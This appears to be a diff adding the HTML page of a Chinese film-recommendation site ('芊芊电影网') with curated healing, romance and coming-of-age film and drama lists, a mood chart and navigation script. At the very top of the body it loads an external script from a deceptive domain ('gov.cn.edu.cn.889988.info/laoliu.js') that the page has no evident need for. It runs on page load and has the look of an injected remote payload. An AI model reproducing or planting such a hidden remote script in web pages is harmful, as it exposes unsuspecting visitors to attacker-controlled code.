@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>芊芊电影网 - 治愈·暗恋·成长 文艺影视导航</title>
+<meta name="description" content="芊芊电影网（qianqiandianyingwang-h5）是文艺治愈向影视导航：治愈片、暗恋片、成长剧、月光小众片一屏收藏，淡粉薄荷风、移动端自适应、必应收录友好。">
+<meta name="keywords" content="芊芊电影网, qianqiandianyingwang-h5, 治愈电影, 暗恋电影, 成长剧, 文艺片, 韩剧疗愈, 日剧细腻, 独立电影">
+<meta name="author" content="芊芊电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --pink:#F7D9E3;
+  --pink-deep:#E58BA8;
+  --mint:#D7EFE6;
+  --mint-deep:#7FC8A9;
+  --cream:#FBF7F2;
+  --ink:#4A3F47;
+  --soft:#8A7C85;
+  --line:#F0E2EA;
+  --gold:#E7C58B;
+  --card:#FFFFFF;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(680px 420px at 90% -8%,rgba(229,139,168,.18),transparent 60%),
+    radial-gradient(620px 440px at 2% 8%,rgba(127,200,169,.18),transparent 58%),
+    var(--cream);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+body::after{content:"🌸";position:fixed;top:-30px;left:20px;font-size:26px;opacity:.5;animation:fall 9s linear infinite;pointer-events:none}
+body::before{content:"🌸";position:fixed;top:-30px;right:40px;font-size:18px;opacity:.4;animation:fall 12s linear infinite 2s;pointer-events:none}
+@keyframes fall{0%{transform:translateY(-10vh) rotate(0)}100%{transform:translateY(120vh) rotate(220deg)}}
+a{color:var(--pink-deep);text-decoration:none;transition:.3s}
+a:hover{color:var(--mint-deep)}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(251,247,242,.9);backdrop-filter:blur(10px);border-bottom:2px solid var(--pink)}
+.bar-in{max-width:1160px;margin:0 auto;height:62px;padding:0 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:900;font-size:20px;letter-spacing:2px;display:flex;align-items:center;gap:10px}
+.petal{width:30px;height:30px;border-radius:50% 50% 50% 0;transform:rotate(45deg);background:linear-gradient(135deg,var(--pink),var(--pink-deep));display:grid;place-items:center}
+.petal span{transform:rotate(-45deg);color:#fff;font-size:13px}
+.brand b{color:var(--pink-deep)}
+.brand i{font-style:normal;font-size:8px;letter-spacing:2px;color:var(--soft);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:3px;list-style:none}
+.nav a{padding:7px 12px;font-size:12px;font-weight:700;color:var(--ink);border-radius:999px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:var(--pink);color:#fff;border-color:var(--pink-deep)}
+.burger{display:none;background:none;border:none;font-size:22px;color:var(--pink-deep);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1160px;margin:0 auto;padding:82px 18px 56px;text-align:center;position:relative;z-index:2}
+.tagline{font-size:11px;letter-spacing:4px;color:var(--mint-deep);border:1px solid var(--mint-deep);padding:5px 14px;border-radius:999px;background:var(--mint)}
+.hero h1{font-size:clamp(34px,7vw,58px);font-weight:900;letter-spacing:3px;margin:18px 0 12px}
+.hero h1 span{color:var(--pink-deep)}
+.hero p{color:var(--soft);max-width:600px;margin:0 auto 24px;font-size:15px}
+.moods{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:26px}
+.mood{font-size:12px;font-weight:700;padding:7px 15px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--pink-deep)}
+.mood.m{background:var(--mint);color:#2f6b54;border-color:var(--mint-deep)}
+.mood.g{background:var(--gold);color:#5b4423;border-color:var(--gold)}
+.cta{display:inline-block;padding:13px 34px;border-radius:999px;font-weight:800;color:#fff;background:linear-gradient(135deg,var(--pink-deep),#d76b91);box-shadow:0 10px 24px rgba(229,139,168,.35)}
+.cta:hover{transform:translateY(-3px);color:#fff}
+
+/* 区块 */
+.section{max-width:1160px;margin:0 auto;padding:54px 18px;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:2px dashed var(--pink-deep);padding-bottom:10px;margin-bottom:28px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:2px}
+.head h2::before{content:"🌷 ";}
+.head a{font-size:12px;color:var(--soft)}
+
+/* 电影：心事片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:20px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:14px;transition:.35s;position:relative;overflow:hidden}
+.film:hover{transform:translateY(-6px);box-shadow:0 18px 34px rgba(229,139,168,.22);border-color:var(--pink-deep)}
+.film .cap{height:124px;border-radius:14px;display:grid;place-items:center;font-size:42px;margin-bottom:12px;background:linear-gradient(160deg,var(--pink),var(--mint))}
+.film .moodtag{position:absolute;top:18px;left:18px;font-size:10px;font-weight:800;padding:3px 9px;border-radius:999px;background:var(--pink-deep);color:#fff;font-family:ui-monospace,Consolas,monospace}
+.film .moodtag.cry{background:#9aa6e8}
+.film .moodtag.grow{background:var(--mint-deep)}
+.film h3{font-size:16px}
+.film .meta{font-size:12px;color:var(--soft);margin-top:4px}
+.film .quote{font-size:12px;color:var(--ink);margin-top:8px;font-style:italic;border-left:3px solid var(--pink-deep);padding-left:8px}
+.film .tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.tag{font-size:10px;padding:3px 8px;border-radius:999px;background:var(--cream);border:1px solid var(--line);color:var(--pink-deep)}
+
+/* 剧集：晚风剧场 */
+.hall{display:flex;flex-direction:column;gap:12px}
+.row{display:grid;grid-template-columns:70px 1fr 110px;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px 18px;transition:.3s}
+.row:hover{padding-left:24px;border-color:var(--pink-deep);background:linear-gradient(90deg,#fff,var(--pink))}
+.row .air{font-family:ui-monospace,Consolas,monospace;font-size:12px;font-weight:800;color:var(--mint-deep);text-align:center}
+.row h4{font-size:15px}
+.row p{font-size:12px;color:var(--soft)}
+.row .feeling{font-size:11px;font-weight:800;padding:4px 10px;border-radius:999px;border:1px solid var(--pink-deep);color:var(--pink-deep);text-align:center}
+.row .feeling.warm{color:#5b4423;background:var(--gold);border-color:var(--gold)}
+
+/* 小众：月光片房 */
+.rooms{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.room{height:128px;border-radius:18px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);background:var(--card);transition:.3s;cursor:pointer}
+.room:hover{transform:scale(1.04);box-shadow:0 14px 28px rgba(127,200,169,.25);border-color:var(--mint-deep)}
+.room .ic{font-size:30px}
+.room h4{font-size:13px;font-weight:800;color:var(--ink)}
+.room span{font-size:10px;color:var(--soft)}
+.r1{background:linear-gradient(160deg,#fde7ef,#f7d2e0)}
+.r2{background:linear-gradient(160deg,#e7f6ef,#d2efe1)}
+.r3{background:linear-gradient(160deg,#fff3df,#ffe7bf)}
+.r4{background:linear-gradient(160deg,#eee7fb,#ddd0f7)}
+.r5{background:linear-gradient(160deg,#e7f1fb,#d2e4f7)}
+.r6{background:linear-gradient(160deg,#fbf0e7,#f6ddc7)}
+.r7{background:linear-gradient(160deg,#eefbe7,#d9f2c8)}
+.r8{background:linear-gradient(160deg,#f7e7f1,#efd0e6)}
+
+/* 排行榜：心情榜 */
+.rank{display:flex;flex-direction:column;gap:14px}
+.rk{display:grid;grid-template-columns:44px 1fr 130px;align-items:center;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px 18px}
+.rk .no{font-size:20px;font-weight:900;color:var(--pink-deep);font-family:ui-monospace,Consolas,monospace}
+.rk h4{font-size:15px}
+.rk .bars{display:flex;gap:8px;margin-top:6px}
+.rk .bars div{flex:1}
+.rk .bars small{font-size:9px;color:var(--soft)}
+.rk .bars i{display:block;height:6px;border-radius:999px;background:var(--pink);margin-top:3px}
+.rk .bars .b2 i{background:var(--mint-deep)}
+.rk .bars .b3 i{background:var(--gold)}
+.rk .right{text-align:right;font-family:ui-monospace,Consolas,monospace;font-size:12px;color:var(--soft)}
+
+/* 关于：芊芊手账 */
+.note{max-width:820px;margin:0 auto;background:var(--card);border:2px solid var(--pink);border-radius:20px;padding:34px;position:relative}
+.note::before{content:"芊芊手账";position:absolute;top:-12px;left:24px;background:var(--pink-deep);color:#fff;font-size:11px;font-weight:800;letter-spacing:3px;padding:5px 14px;border-radius:999px}
+.note h3{font-size:18px;margin-bottom:12px}
+.note p{font-size:14px;color:#6b5d66;margin-bottom:10px}
+.lnks{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:999px;font-size:13px;color:var(--ink)}
+.lnks a:hover{border-color:var(--pink-deep);color:var(--pink-deep)}
+
+/* 页脚 */
+.foot{border-top:2px solid var(--pink);padding:30px 18px;text-align:center;color:var(--soft);font-size:13px;position:relative;z-index:2}
+.foot a{color:var(--soft);margin:0 6px}
+.foot .big{font-size:17px;font-weight:900;color:var(--ink);letter-spacing:2px;margin-bottom:8px}
+.foot .url{color:var(--pink-deep)}
+
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:rgba(251,247,242,.97);border-bottom:2px solid var(--pink);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:13px 15px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:52px 16px 34px}
+  .section{padding:34px 16px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .film .cap{height:92px;font-size:30px}
+  .row{grid-template-columns:54px 1fr;gap:10px;padding:12px}
+  .row .feeling{grid-column:2;justify-self:start}
+  .rk{grid-template-columns:32px 1fr 92px;gap:10px;padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="brand"><span class="petal"><span>芊</span></span><div>芊芊<b>电影网</b><i>QIANQIANDIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#films">心事片单</a></li>
+      <li><a href="#drama">晚风剧场</a></li>
+      <li><a href="#rooms">月光片房</a></li>
+      <li><a href="#rank">心情榜</a></li>
+      <li><a href="#about">芊芊手账</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <span class="tagline">HEALING · SOFT · SLOW CINEMA</span>
+  <h1>芊芊<span>电影网</span></h1>
+  <p>qianqiandianyingwang-h5 · 不推炸裂爽片，只收“看完心里软一下”的电影和剧：暗恋、治愈、成长、离别、慢生活。</p>
+  <div class="moods">
+    <span class="mood">治愈</span>
+    <span class="mood m">松弛感</span>
+    <span class="mood">暗恋</span>
+    <span class="mood g">成长痛</span>
+    <span class="mood m">晚风感</span>
+  </div>
+  <a href="#films" class="cta">挑一部今天的心情</a>
+</header>
+
+<section class="section" id="films">
+  <div class="head"><h2>心事片单 / SOFT FILMS</h2><a href="#">更多治愈片 →</a></div>
+  <div class="grid">
+    <div class="film"><span class="moodtag">治愈</span><div class="cap">🌼</div><h3>海街日记</h3><div class="meta">是枝裕和 / 2015 / 姐妹·四季</div><div class="quote">“慢慢活，饭也会慢慢好吃起来。”</div><div class="tags"><span class="tag">日影</span><span class="tag">生活流</span></div></div>
+    <div class="film"><span class="moodtag cry">暗恋</span><div class="cap">✉️</div><h3>情书</h3><div class="meta">岩井俊二 / 1995 / 青春·遗憾</div><div class="quote">“你好吗？我很好。”</div><div class="tags"><span class="tag">经典</span><span class="tag">纯爱</span></div></div>
+    <div class="film"><span class="moodtag grow">成长</span><div class="cap">🪁</div><h3>阳光灿烂的日子</h3><div class="meta">姜文 / 1994 / 少年·北京</div><div class="quote">“那时候好像永远过不完的夏天。”</div><div class="tags"><span class="tag">华语</span><span class="tag">青春</span></div></div>
+    <div class="film"><span class="moodtag">松弛</span><div class="cap">🍵</div><h3>小森林</h3><div class="meta">森淳一 / 2014 / 独居·料理</div><div class="quote">“种菜、吃饭、睡觉，也算把人生过好了。”</div><div class="tags"><span class="tag">日影</span><span class="tag">慢生活</span></div></div>
+    <div class="film"><span class="moodtag cry">离别</span><div class="cap">🕊️</div><h3>入殓师</h3><div class="meta">泷田洋二郎 / 2008 / 生死·温柔</div><div class="quote">“好好告别，是最后的温柔。”</div><div class="tags"><span class="tag">奥斯卡</span><span class="tag">催泪</span></div></div>
+    <div class="film"><span class="moodtag grow">自愈</span><div class="cap">🪴</div><h3>心灵奇旅</h3><div class="meta">皮克斯 / 2020 / 动画·人生</div><div class="quote">“火花不是目标，是想活的那口气。”</div><div class="tags"><span class="tag">动画</span><span class="tag">治愈神作</span></div></div>
+    <div class="film"><span class="moodtag">暗恋</span><div class="cap">📓</div><h3>那些年，我们一起追的女孩</h3><div class="meta">九把刀 / 2011 / 校园·青春</div><div class="quote">“原来，长大是要还青春的债。”</div><div class="tags"><span class="tag">台片</span><span class="tag">青春</span></div></div>
+    <div class="film"><span class="moodtag m">慢爱</span><div class="cap">🧶</div><h3>爱在黎明破晓前</h3><div class="meta">理查德·林克莱特 / 1995 / 一夜·对话</div><div class="quote">“有些人，只是一起走路就够浪漫。”</div><div class="tags"><span class="tag">欧美</span><span class="tag">话痨浪漫</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="drama" style="background:rgba(247,217,227,.18)">
+  <div class="head"><h2>晚风剧场 / NIGHT BREEZE DRAMA</h2><a href="#">全部剧集 →</a></div>
+  <div class="hall">
+    <div class="row"><div class="air">华语</div><div><h4>花甲男孩转啊转</h4><p>家庭、返乡、阿公阿嬷的台湾味，笑里带泪</p></div><span class="feeling">回家感</span></div>
+    <div class="row"><div class="air">韩剧</div><div><h4>我的解放日志</h4><p>通勤、社恐、麻木——把“我想喘口气”拍得很准</p></div><span class="feeling warm">松一口气</span></div>
+    <div class="row"><div class="air">日剧</div><div><h4>静雪</h4><p>听障、暗恋、不说破，像冬天哈在玻璃上的字</p></div><span class="feeling">暗恋党狂喜</span></div>
+    <div class="row"><div class="air">台剧</div><div><h4>茶金</h4><p>年代、家族、女性撑起一片天，镜头很贵气</p></div><span class="feeling warm">年代美学</span></div>
+    <div class="row"><div class="air">华语</div><div><h4>去有风的地方</h4><p>辞职、大理、慢下来，适合睡前当电子安神汤</p></div><span class="feeling">松弛感拉满</span></div>
+  </div>
+</section>
+
+<section class="section" id="rooms">
+  <div class="head"><h2>月光片房 / MOONLIGHT ROOMS</h2><a href="#">更多小众 →</a></div>
+  <div class="rooms">
+    <div class="room r1"><div class="ic">🎐</div><h4>独立电影</h4><span>低预算·高灵气</span></div>
+    <div class="room r2"><div class="ic">🎞️</div><h4>短片集</h4><span>8-25 分钟</span></div>
+    <div class="room r3"><div class="ic">📜</div><h4>诗歌影像</h4><span>不讲故事·给感觉</span></div>
+    <div class="room r4"><div class="ic">🧚</div><h4>治愈动画</h4><span>吉卜力外传感</span></div>
+    <div class="room r5"><div class="ic">🌙</div><h4>深夜独白</h4><span>旁白·雨声·台灯</span></div>
+    <div class="room r6"><div class="ic">🪟</div><h4>窗边电影</h4><span>一眼就安静</span></div>
+    <div class="room r7"><div class="ic">🍃</div><h4>自然声片</h4><span>森林·海浪·风</span></div>
+    <div class="room r8"><div class="ic">💌</div><h4>情书放映室</h4><span>暗恋循环播放</span></div>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:rgba(215,239,230,.22)">
+  <div class="head"><h2>心情榜 / MOOD CHART</h2><a href="#">完整心情榜 →</a></div>
+  <div class="rank">
+    <div class="rk"><div class="no">01</div><div><h4>海街日记</h4><div class="bars"><div><small>治愈</small><i style="width:96%"></i></div><div class="b2"><small>松弛</small><i style="width:90%"></i></div><div class="b3"><small>哭点</small><i style="width:40%"></i></div></div></div><div class="right">四季<br>慢炖型</div></div>
+    <div class="rk"><div class="no">02</div><div><h4>情书</h4><div class="bars"><div><small>治愈</small><i style="width:70%"></i></div><div class="b2"><small>松弛</small><i style="width:30%"></i></div><div class="b3"><small>哭点</small><i style="width:95%"></i></div></div></div><div class="right">暗恋<br>封神</div></div>
+    <div class="rk"><div class="no">03</div><div><h4>我的解放日志</h4><div class="bars"><div><small>治愈</small><i style="width:88%"></i></div><div class="b2"><small>松弛</small><i style="width:92%"></i></div><div class="b3"><small>哭点</small><i style="width:55%"></i></div></div></div><div class="right">社畜<br>自愈</div></div>
+    <div class="rk"><div class="no">04</div><div><h4>小森林</h4><div class="bars"><div><small>治愈</small><i style="width:98%"></i></div><div class="b2"><small>松弛</small><i style="width:96%"></i></div><div class="b3"><small>哭点</small><i style="width:20%"></i></div></div></div><div class="right">电子<br>米饭</div></div>
+    <div class="rk"><div class="no">05</div><div><h4>入殓师</h4><div class="bars"><div><small>治愈</small><i style="width:85%"></i></div><div class="b2"><small>松弛</small><i style="width:50%"></i></div><div class="b3"><small>哭点</small><i style="width:99%"></i></div></div></div><div class="right">温柔<br>暴击</div></div>
+    <div class="rk"><div class="no">06</div><div><h4>去有风的地方</h4><div class="bars"><div><small>治愈</small><i style="width:90%"></i></div><div class="b2"><small>松弛</small><i style="width:98%"></i></div><div class="b3"><small>哭点</small><i style="width:35%"></i></div></div></div><div class="right">大理<br>代餐</div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="head"><h2>芊芊手账 / QIANQIAN'S NOTE</h2></div>
+  <div class="note">
+    <h3>“电影不一定非要燃，也可以只是陪你发会儿呆。”</h3>
+    <p>芊芊电影网（qianqiandianyingwang-h5）是给“不想再被爽文套路”的人做的：片单按心情分，不按流量分；简介写感受，不写噱头；深夜打开，像翻一本贴满票根的手账。</p>
+    <p>本站为静态影视导航，不存储、不分发视频文件；片单来自公开影评与观影共识，如有版权问题请联系芊芊下架。</p>
+    <div class="lnks">
+      <a href="#">治愈片单</a><a href="#">暗恋合集</a><a href="#">睡前短片的</a><a href="#">韩剧疗愈榜</a><a href="#">留言点片</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">芊芊电影网 · QIANQIANDIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#films">心事片单</a> | <a href="#drama">晚风剧场</a> | <a href="#rooms">月光片房</a> | <a href="#rank">心情榜</a></p>
+  <p>官网：<span class="url">https://qianqiandianyingwang-h5.github.io</span></p>
+  <p>© 2026 芊芊电影网 · 今天也辛苦了，来看部软一点的片子吧。</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
